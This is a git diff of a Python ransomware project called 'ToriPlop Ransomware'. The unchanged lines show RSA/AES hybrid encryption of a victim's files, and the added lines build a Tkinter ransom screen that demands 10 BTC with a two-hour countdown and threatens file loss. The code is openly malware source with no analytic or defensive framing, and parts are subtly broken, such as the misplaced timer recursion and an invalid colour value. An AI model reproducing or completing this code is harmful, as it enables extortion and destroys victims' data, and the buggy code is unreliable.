@@ -1,6 +1,6 @@
 import base64
 import os
-import tkinter
+import tkinter as tk
 from pathlib import Path
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
@@ -45,7 +45,8 @@ def encrypt(dataFile, publicKey):
 
     # save the encrypted data to file
     fileName = dataFile.split(extension)[0]
-    fileExtension = 'y0uRD00m3d'
+    fileExtension = 'ToriPlop'#y0uRD00m3d
+
     encryptFile = fileName + fileExtension
     with open(encryptFile, 'wb') as f:
         [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
@@ -70,4 +71,28 @@ def countdown(count):
     second = int(second)
 
 
-    label['text' = ''
+    label['text'] = '{}:{}:{}'.format(hour, minute, second)
+
+    if second > 0:
+        second -=1
+    elif minute > 0:
+        minute -=1
+        second = 59
+    elif hour > 0:
+        hour -=1
+        minute = 59
+        second = 59
+        root.after(1000, countdown, '{}:{}:{}'.format(hour,minute,second))
+
+root = tk.Tk()
+root.title('ToriPlop Ransomware')
+root.geometry('500x300')
+root.resizable(False, False)
+label1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\nto unlock them !!!\n\n', font=('calibri', 12, 'bold'))
+label1.pack()
+label = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')
+label.pack()
+label2 = tk.Label(root, text = '\n\n If the time runs out your file\nwill be gone !!!\n\n', font=('calibri', 12, 'bold'))
+label2.pack()
+countdown('02:00:00')
+root.mainloop()
